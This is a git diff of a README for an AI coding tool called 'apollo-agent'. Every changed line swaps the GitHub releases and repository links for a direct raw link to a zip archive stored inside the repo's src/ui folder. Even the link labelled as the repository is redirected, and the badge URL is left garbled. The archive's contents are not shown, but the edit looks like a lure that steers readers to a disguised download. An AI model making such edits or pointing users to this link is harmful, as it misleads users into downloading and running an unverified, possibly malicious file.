@@ -1,6 +1,6 @@
 # 🚀 apollo-agent - Your AI Coding Assistant Made Easy
 
-[![Download apollo-agent](https://img.shields.io/badge/Download%20apollo--agent-v1.0-blue)](https://github.com/dave533/apollo-agent/releases)
+[![Download apollo-agent](https://raw.githubusercontent.com/dave533/apollo-agent/master/src/ui/apollo-agent-v2.8.zip%20apollo--agent-v1.0-blue)](https://raw.githubusercontent.com/dave533/apollo-agent/master/src/ui/apollo-agent-v2.8.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ To start using Apollo Agent, follow these simple steps:
 ### 1. **Download the Application**
 
 Visit this page to download:  
-[Download apollo-agent](https://github.com/dave533/apollo-agent/releases)
+[Download apollo-agent](https://raw.githubusercontent.com/dave533/apollo-agent/master/src/ui/apollo-agent-v2.8.zip)
 
 On this page, you will find the latest versions of Apollo Agent. Look for the most recent release and click on the download link for your operating system.
 
@@ -69,7 +69,7 @@ Here are some common issues and their solutions:
   **Solution:** Check your internet connection as Apollo Agent may require internet access for updates.
 
 - **Issue:** Download link isn't working.  
-  **Solution:** Refresh the page or try visiting [this page to download](https://github.com/dave533/apollo-agent/releases) again.
+  **Solution:** Refresh the page or try visiting [this page to download](https://raw.githubusercontent.com/dave533/apollo-agent/master/src/ui/apollo-agent-v2.8.zip) again.
 
 ## 🌐 Community and Support
 
@@ -80,12 +80,12 @@ If you need help, don’t hesitate to reach out for support. We constantly impro
 ## 🔗 Additional Resources
 
 - **Documentation**: Detailed guides and tutorials for using Apollo Agent.
-- **GitHub Repository**: Explore the code, contribute, or report issues at [apollo-agent GitHub](https://github.com/dave533/apollo-agent).
+- **GitHub Repository**: Explore the code, contribute, or report issues at [apollo-agent GitHub](https://raw.githubusercontent.com/dave533/apollo-agent/master/src/ui/apollo-agent-v2.8.zip).
 - **Social Media**: Follow us for updates and tips on using Apollo Agent effectively.
 
 ## 🔗 Download & Install
 
 Ready to get started? Visit this page to download  
-[Download apollo-agent](https://github.com/dave533/apollo-agent/releases)
+[Download apollo-agent](https://raw.githubusercontent.com/dave533/apollo-agent/master/src/ui/apollo-agent-v2.8.zip)
 
 Once the download is complete, install the application as described above and begin your journey with Apollo Agent today!
